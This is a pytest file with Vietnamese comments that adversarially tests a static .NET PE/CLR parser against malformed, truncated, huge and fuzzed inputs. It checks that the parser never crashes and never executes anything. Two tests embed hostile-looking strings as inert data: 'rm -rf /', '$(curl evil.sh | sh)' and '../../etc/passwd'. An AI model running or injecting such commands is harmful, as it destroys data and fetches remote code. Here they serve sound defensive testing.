"""G0-NET — tester adversarial độc lập cho ``namios_dotnet`` (parser PE/CLR
tĩnh, WP .NET). KHÔNG sửa test dev (``tests/unit/dotnet/*``), viết case
KHÁC để không trùng lặp.

Mục tiêu bắt buộc (brief adversarial G0-NET):
  - 'MZ' với ``e_lfanew`` trỏ ra ngoài file / âm (không thể âm thật qua
    unsigned little-endian, nhưng kiểm biên == len(data) và vùng giá trị
    cực lớn 32-bit) / khổng lồ.
  - PE header cụt ở TẤT CẢ các điểm cắt hợp lý (không chỉ 1-2 điểm dev đã
    test) — slicing boundary ngay tại biên chữ ký PE.
  - Data directory count bịa lớn (biên đúng ``MAX_DATA_DIRECTORIES``).
  - Optional header magic lạ (giá trị khác dev đã dùng).
  - File 0 byte.
  - File rất lớn (phải bị giới hạn, không OOM) — kiểm THỜI GIAN chạy có
    chặn chứ không chỉ cờ ``truncated``.
  - Bytes ngẫu nhiên (fuzz xác định, seed cố định để tái lập) khởi đầu
    bằng 'MZ' lẫn không.
  - KHÔNG BAO GIỜ crash kiểu uncaught, KHÔNG đọc vượt giới hạn, KHÔNG treo,
    KHÔNG thực thi (monkeypatch os.system/subprocess để bắt lời gọi lạ).

Không import ``tests/unit/dotnet/_fixtures.py`` của dev; tự dựng fixture
PE bằng ``fixtures/dotnet/pe_builder`` (module công khai, dùng lại builder
không phải sao chép case test) hoặc raw bytes tự viết.
"""

from __future__ import annotations

import os
import random
import struct
import subprocess
import sys
import time
from pathlib import Path

import pytest

_REPO_ROOT = Path(__file__).resolve().parents[3]
_SRC_DIR = str(_REPO_ROOT / "src")
if _SRC_DIR not in sys.path:
    sys.path.insert(0, _SRC_DIR)
_FIXTURES_DOTNET_DIR = str(_REPO_ROOT / "fixtures" / "dotnet")
if _FIXTURES_DOTNET_DIR not in sys.path:
    sys.path.insert(0, _FIXTURES_DOTNET_DIR)

import pe_builder  # type: ignore[import-not-found]  # noqa: E402

from namios_dotnet import DotnetAnalysisError, DotnetAnalyzer, MalformedPeError, PeKind  # noqa: E402
from namios_dotnet import pe_format  # noqa: E402

# ===========================================================================
# 1) e_lfanew: biên == len(data) (không âm hơn, không vượt — đúng biên
#    điều kiện ``>`` trong code), và giá trị 32-bit tối đa (0xFFFFFFFF).
# ===========================================================================


def test_e_lfanew_exactly_equal_to_buffer_length_is_malformed_not_crash() -> None:
    """``e_lfanew == len(data)`` đi qua được check ``> len(data)`` (biên
    đúng bằng, không vượt) nhưng sau đó không còn byte nào để đọc chữ ký PE
    — phải là ``MalformedPeError`` có kiểm soát, không phải ``IndexError``
    hay silent-wrong-result."""

    data = pe_builder.build_dos_header(e_lfanew=64)  # len(data) == 64
    assert len(data) == 64
    dos = pe_format.parse_dos_header(data)
    assert dos.e_lfanew == 64
    with pytest.raises(MalformedPeError):
        pe_format.parse_coff_header(data, dos.e_lfanew)


def test_e_lfanew_max_uint32_value_rejected_not_crash() -> None:
    """``e_lfanew`` = 0xFFFFFFFF (giá trị lớn nhất biểu diễn được bởi field
    ``<I`` 4-byte không dấu — gần nhất với "âm" mà khuôn dạng nhị phân này
    cho phép) phải bị chặn ở ``parse_dos_header`` (vượt kích thước buffer),
    không được truyền tiếp xuống tầng dưới."""

    buf = bytearray(pe_builder.build_dos_header(e_lfanew=0))
    struct.pack_into("<I", buf, 0x3C, 0xFFFFFFFF)
    with pytest.raises(MalformedPeError):
        pe_format.parse_dos_header(bytes(buf))


def test_analyzer_handles_e_lfanew_max_uint32_end_to_end(tmp_path: Path) -> None:
    buf = bytearray(pe_builder.build_dos_header(e_lfanew=0))
    struct.pack_into("<I", buf, 0x3C, 0xFFFFFFFF)
    f = tmp_path / "evil_lfanew.bin"
    f.write_bytes(bytes(buf))

    result = DotnetAnalyzer().analyze(str(f))

    assert result.kind == PeKind.MALFORMED
    assert result.confidence == 0.0
    assert result.suggested_mode is None


# ===========================================================================
# 2) PE header cụt — cắt ở TẤT CẢ các biên hợp lý qua ``DotnetAnalyzer``
#    end-to-end (dev chỉ test tầng pe_format trực tiếp, không end-to-end
#    qua tất cả các điểm cắt).
# ===========================================================================


@pytest.mark.parametrize(
    "cut_len",
    [0, 1, 2, 3, 0x3C, 0x3C + 1, 0x3C + 3, 0x40, 0x40 + 1, 0x40 + 4, 0x40 + 23, 0x40 + 24],
)
def test_truncated_at_every_relevant_boundary_never_crashes(tmp_path: Path, cut_len: int) -> None:
    """Dựng một PE managed hợp lệ đầy đủ rồi CẮT CỤT tại nhiều biên khác
    nhau (ngay trước/giữa/sau DOS header, chữ ký PE, COFF header) — mọi độ
    cắt phải cho kết quả có kiểm soát (``NOT_PE`` nếu thiếu cả 'MZ', hoặc
    ``MALFORMED``), không bao giờ raise ngoại lệ không mong muốn."""

    full = pe_builder.build_managed_pe32_anycpu_minimal()
    truncated = full[:cut_len]
    f = tmp_path / f"cut_{cut_len}.dll"
    f.write_bytes(truncated)

    result = DotnetAnalyzer().analyze(str(f))

    assert result.kind in (PeKind.NOT_PE, PeKind.MALFORMED)
    assert result.confidence == 0.0
    assert result.suggested_mode is None


def test_pe_signature_slice_exactly_at_buffer_end_is_malformed() -> None:
    """``pe_header_offset + 4 == len(data)`` — slicing Python không ném lỗi
    khi vượt biên (trả chuỗi ngắn hơn), chỉ so sánh != signature mới bắt
    được; xác nhận KHÔNG có nhánh nào coi nhầm slice-ngắn là chữ ký hợp lệ."""

    dos = pe_builder.build_dos_header(e_lfanew=64)
    data = dos + b"PE\x00"  # chỉ 3/4 byte chữ ký PE, đúng hết buffer
    assert len(data) == 64 + 3
    with pytest.raises(MalformedPeError):
        pe_format.parse_coff_header(data, 64)


def test_coff_header_truncated_right_after_signature() -> None:
    dos = pe_builder.build_dos_header(e_lfanew=64)
    data = dos + b"PE\x00\x00" + b"\x01\x02\x03"  # 3 byte lẻ của COFF header
    with pytest.raises(MalformedPeError):
        pe_format.parse_coff_header(data, 64)


# ===========================================================================
# 3) Data directory count bịa lớn — đúng biên ``MAX_DATA_DIRECTORIES``.
# ===========================================================================


def test_number_of_rva_and_sizes_exactly_at_limit_is_accepted() -> None:
    data = pe_builder.build_native_pe32plus_minimal()
    dos = pe_format.parse_dos_header(data)
    coff = pe_format.parse_coff_header(data, dos.e_lfanew)
    mutated = bytearray(data)
    struct.pack_into("<I", mutated, coff.optional_header_offset + 108, pe_format.MAX_DATA_DIRECTORIES)
    optional = pe_format.parse_optional_header(bytes(mutated), coff)
    assert optional.number_of_rva_and_sizes == pe_format.MAX_DATA_DIRECTORIES


def test_number_of_rva_and_sizes_one_above_limit_is_rejected() -> None:
    data = pe_builder.build_native_pe32plus_minimal()
    dos = pe_format.parse_dos_header(data)
    coff = pe_format.parse_coff_header(data, dos.e_lfanew)
    mutated = bytearray(data)
    struct.pack_into(
        "<I", mutated, coff.optional_header_offset + 108, pe_format.MAX_DATA_DIRECTORIES + 1
    )
    with pytest.raises(MalformedPeError):
        pe_format.parse_optional_header(bytes(mutated), coff)


def test_number_of_rva_and_sizes_bogus_near_uint32_max_rejected() -> None:
    """Giá trị "bịa" cực lớn gần ``0xFFFFFFFF`` (không chỉ một số tròn như
    999999 mà dev đã test) — kiểm việc chặn không phụ thuộc độ lớn cụ thể."""

    data = pe_builder.build_native_pe32plus_minimal()
    dos = pe_format.parse_dos_header(data)
    coff = pe_format.parse_coff_header(data, dos.e_lfanew)
    mutated = bytearray(data)
    struct.pack_into("<I", mutated, coff.optional_header_offset + 108, 0xFFFFFFF0)
    with pytest.raises(MalformedPeError):
        pe_format.parse_optional_header(bytes(mutated), coff)


def test_section_count_exactly_at_max_but_buffer_too_small_is_malformed() -> None:
    """Khai báo ``NumberOfSections == MAX_SECTIONS`` (đúng biên được PHÉP ở
    tầng COFF — không bị chặn ở đó) nhưng file thực tế không có đủ byte cho
    toàn bộ bảng section — ``parse_section_table`` phải báo lỗi có kiểm
    soát, không đọc tràn/giả định dữ liệu 0."""

    data = (
        pe_builder.build_dos_header(e_lfanew=64)
        + b"PE\x00\x00"
        + struct.pack("<HHIIIHH", pe_builder.MACHINE_I386, pe_format.MAX_SECTIONS, 0, 0, 0, 0, 0)
    )
    dos = pe_format.parse_dos_header(data)
    coff = pe_format.parse_coff_header(data, dos.e_lfanew)
    assert coff.number_of_sections == pe_format.MAX_SECTIONS
    with pytest.raises(MalformedPeError):
        pe_format.parse_section_table(data, coff)


# ===========================================================================
# 4) Optional header magic lạ — giá trị KHÁC dev đã dùng (0xDEAD), bao gồm
#    các magic PE "gần đúng" dễ gây coerce nhầm (byte-swap 0x0B01, lệch 1
#    đơn vị so với magic hợp lệ 0x010A/0x020C, 0x0000, giá trị lớn 0xFFFF).
# ===========================================================================


@pytest.mark.parametrize("bogus_magic", [0x0000, 0xFFFF, 0x0B01, 0x20B0, 0x010A, 0x020C])
def test_optional_header_assorted_bogus_magics_rejected(bogus_magic: int) -> None:
    data = pe_builder.build_native_pe32plus_minimal()
    dos = pe_format.parse_dos_header(data)
    coff = pe_format.parse_coff_header(data, dos.e_lfanew)
    mutated = bytearray(data)
    struct.pack_into("<H", mutated, coff.optional_header_offset, bogus_magic)
    with pytest.raises(MalformedPeError):
        pe_format.parse_optional_header(bytes(mutated), coff)


# ===========================================================================
# 5) File 0 byte — qua cả ``pe_format`` trực tiếp và ``DotnetAnalyzer``.
# ===========================================================================


def test_zero_byte_buffer_at_pe_format_layer_is_malformed() -> None:
    with pytest.raises(MalformedPeError):
        pe_format.parse_dos_header(b"")


def test_zero_byte_file_end_to_end_via_analyzer(tmp_path: Path) -> None:
    f = tmp_path / "empty.exe"
    f.write_bytes(b"")

    result = DotnetAnalyzer().analyze(str(f))

    assert result.kind == PeKind.NOT_PE
    assert result.confidence == 0.0
    assert result.suggested_mode is None
    assert result.evidence


# ===========================================================================
# 6) File rất lớn — phải bị giới hạn kích thước THẬT (đo thời gian, không
#    chỉ tin cờ ``truncated``) — dùng sparse file (truncate, không viết hết
#    byte) để không tốn disk/RAM thật trong lúc TẠO fixture, nhưng việc ĐỌC
#    của analyzer vẫn phải bị cắt ở ``max_bytes`` (không đọc hết 256 MiB).
# ===========================================================================


def test_huge_sparse_file_analysis_bounded_by_max_pe_bytes_and_fast(tmp_path: Path) -> None:
    huge_size = 256 * 1024 * 1024  # 256 MiB — vượt xa DEFAULT_MAX_PE_BYTES (8 MiB)
    f = tmp_path / "huge_sparse.bin"
    with open(f, "wb") as fh:
        fh.write(b"MZ")
        fh.seek(huge_size - 1)
        fh.write(b"\x00")
    assert f.stat().st_size == huge_size

    started = time.monotonic()
    result = DotnetAnalyzer().analyze(str(f))
    elapsed = time.monotonic() - started

    # Phải trả kết quả nhanh (không đọc toàn bộ 256 MiB vào bộ nhớ/duyệt
    # tuyến tính) — ngưỡng rộng (5s) để tránh flaky trên máy chậm, nhưng đủ
    # chặt để bắt một implementation "quên" giới hạn và đọc/scan hết file.
    assert elapsed < 5.0, f"phân tích file 256MiB mất {elapsed:.2f}s — nghi KHÔNG bị giới hạn đọc"
    assert any("vượt giới hạn đọc" in w for w in result.warnings_vi)
    # Nội dung thật đọc được chỉ 'MZ' + zero padding bên trong giới hạn —
    # không đủ cấu trúc PE hợp lệ phía sau ⇒ MALFORMED, không phải crash.
    assert result.kind == PeKind.MALFORMED


def test_huge_file_with_valid_header_prefix_still_capped(tmp_path: Path) -> None:
    """File khổng lồ nhưng phần ĐẦU (trong giới hạn đọc) là một PE managed
    hợp lệ hoàn chỉnh — xác nhận parser vẫn phân loại đúng dựa trên phần đã
    đọc, KHÔNG cố đọc thêm phía sau để "xác minh thêm", và vẫn báo
    ``truncated``."""

    valid_prefix = pe_builder.build_managed_pe32_anycpu_minimal()
    huge_size = 64 * 1024 * 1024  # 64 MiB
    f = tmp_path / "huge_valid_prefix.bin"
    with open(f, "wb") as fh:
        fh.write(valid_prefix)
        fh.seek(huge_size - 1)
        fh.write(b"\x00")

    started = time.monotonic()
    result = DotnetAnalyzer().analyze(str(f))
    elapsed = time.monotonic() - started

    assert elapsed < 5.0
    assert result.kind == PeKind.MANAGED
    assert any("vượt giới hạn đọc" in w for w in result.warnings_vi)


# ===========================================================================
# 7) Bytes ngẫu nhiên — fuzz XÁC ĐỊNH (seed cố định, tái lập được), cả có
#    và không có tiền tố 'MZ'.
# ===========================================================================


def _run_analyze_never_crashes(data: bytes, tmp_path: Path, idx: int) -> None:
    f = tmp_path / f"fuzz_{idx}.bin"
    f.write_bytes(data)
    try:
        result = DotnetAnalyzer().analyze(str(f))
    except DotnetAnalysisError:
        # Lỗi thao tác hợp lệ (vd path) không thể xảy ra ở đây (path luôn
        # tuyệt đối, file luôn tồn tại, không symlink) — nếu xảy ra, coi là
        # bất thường cần fail rõ ràng thay vì nuốt im lặng.
        raise AssertionError("DotnetAnalysisError không mong đợi cho fuzz input hợp lệ-path")
    except Exception as exc:  # noqa: BLE001 - đây CHÍNH LÀ điều test kiểm tra
        pytest.fail(
            f"fuzz input idx={idx} (len={len(data)}, head={data[:16]!r}) làm "
            f"DotnetAnalyzer.analyze crash với ngoại lệ không kiểm soát: "
            f"{type(exc).__name__}: {exc}"
        )
    else:
        assert result.kind in (PeKind.NOT_PE, PeKind.MALFORMED, PeKind.NATIVE, PeKind.MANAGED, PeKind.MANAGED_MIXED)


def test_fuzz_pure_random_bytes_without_mz_prefix_never_crashes(tmp_path: Path) -> None:
    rng = random.Random(20261102)  # seed cố định — tái lập được
    for i in range(60):
        length = rng.randint(0, 4096)
        data = bytes(rng.getrandbits(8) for _ in range(length))
        _run_analyze_never_crashes(data, tmp_path, i)


def test_fuzz_random_bytes_with_mz_prefix_never_crashes(tmp_path: Path) -> None:
    """Tiền tố 'MZ' cố ý giữ nguyên để ép parser đi SÂU vào các tầng
    COFF/Optional/section/CLR header trên dữ liệu ngẫu nhiên phía sau — đây
    là vùng nguy hiểm nhất (offset tự xưng từ dữ liệu rác)."""

    rng = random.Random(777)
    for i in range(80):
        length = rng.randint(2, 2048)
        tail = bytes(rng.getrandbits(8) for _ in range(max(0, length - 2)))
        data = b"MZ" + tail
        _run_analyze_never_crashes(data, tmp_path, 1000 + i)


def test_fuzz_mutated_valid_pe_byte_flips_never_crashes(tmp_path: Path) -> None:
    """Fuzz có định hướng hơn: lấy PE managed HỢP LỆ rồi lật từng nhóm byte
    ngẫu nhiên (giữ 'MZ' ở đầu, không chạm 2 byte đầu) — mô phỏng file thật
    bị hỏng cục bộ (lỗi copy/transfer) thay vì rác hoàn toàn ngẫu nhiên."""

    base = bytearray(pe_builder.build_managed_pe32_anycpu_minimal())
    rng = random.Random(31337)
    for i in range(40):
        mutated = bytearray(base)
        num_flips = rng.randint(1, 20)
        for _ in range(num_flips):
            pos = rng.randrange(2, len(mutated))  # không chạm 'MZ'
            mutated[pos] = rng.getrandbits(8)
        _run_analyze_never_crashes(bytes(mutated), tmp_path, 2000 + i)


# ===========================================================================
# 8) KHÔNG thực thi gì — monkeypatch bắt mọi lời gọi "nguy hiểm" trong lúc
#    phân tích dữ liệu PE/CLR cố ý ác ý (vd chứa chuỗi trông như lệnh shell
#    ở nơi parser không nên diễn giải là lệnh).
# ===========================================================================


def test_analyzer_never_calls_subprocess_or_os_system_on_malicious_looking_payload(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def _boom(*args: object, **kwargs: object) -> None:
        raise AssertionError(
            f"namios_dotnet đã gọi os.system/subprocess trong lúc phân tích TĨNH — "
            f"vi phạm NET-001 (không thực thi): args={args!r}"
        )

    monkeypatch.setattr(os, "system", _boom)
    monkeypatch.setattr(subprocess, "run", _boom)
    monkeypatch.setattr(subprocess, "Popen", _boom)
    monkeypatch.setattr(subprocess, "call", _boom)

    # Payload cố ý trông như command injection cổ điển, nhúng trong vùng dữ
    # liệu section raw (nơi không có lý do gì được diễn giải là lệnh).
    payload_marker = b"; rm -rf / #" + b"$(curl evil.sh | sh)" + b"\x00" * 16
    data = (
        pe_builder.build_dos_header(e_lfanew=64)
        + b"PE\x00\x00"
        + struct.pack("<HHIIIHH", pe_builder.MACHINE_I386, 0, 0, 0, 0, 0, 0)
        + payload_marker
    )
    f = tmp_path / "shell_lookalike.dll"
    f.write_bytes(data)

    # Không raise từ _boom nghĩa là không có lời gọi exec nào xảy ra —
    # analyze() vẫn phải trả kết quả có kiểm soát (không crash vì lý do
    # khác), không liên quan tới payload "giống lệnh shell".
    result = DotnetAnalyzer().analyze(str(f))
    assert result.kind in (PeKind.NOT_PE, PeKind.MALFORMED, PeKind.NATIVE)


def test_runtimeconfig_json_shell_lookalike_strings_never_executed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Sidecar ``.runtimeconfig.json`` với giá trị chuỗi trông như lệnh
    shell/path traversal trong TFM — chỉ ``json.loads`` thuần, không bao
    giờ được diễn giải thành lệnh hay dùng để mở file khác."""

    def _boom(*args: object, **kwargs: object) -> None:
        raise AssertionError("os.system/subprocess bị gọi khi đọc sidecar JSON ác ý")

    monkeypatch.setattr(os, "system", _boom)
    monkeypatch.setattr(subprocess, "run", _boom)

    pe_data = pe_builder.build_managed_pe32_anycpu_minimal()
    f = tmp_path / "evil_sidecar.dll"
    f.write_bytes(pe_data)
    sidecar = tmp_path / "evil_sidecar.runtimeconfig.json"
    sidecar.write_text(
        '{"runtimeOptions": {"tfm": "net8.0; rm -rf /", '
        '"framework": {"name": "$(curl evil.sh|sh)", "version": "../../etc/passwd"}}}',
        encoding="utf-8",
    )

    result = DotnetAnalyzer().analyze(str(f))

    assert result.kind == PeKind.MANAGED
    assert result.sidecar is not None
    # Chuỗi độc hại chỉ được coi là DỮ LIỆU văn bản, lưu nguyên vẹn, không
    # được "làm sạch ngầm" thành thứ khác và quan trọng nhất: không có lệnh
    # nào bị thực thi (đã khẳng định qua monkeypatch ở trên).
    assert result.sidecar.target_framework_moniker == "net8.0; rm -rf /"
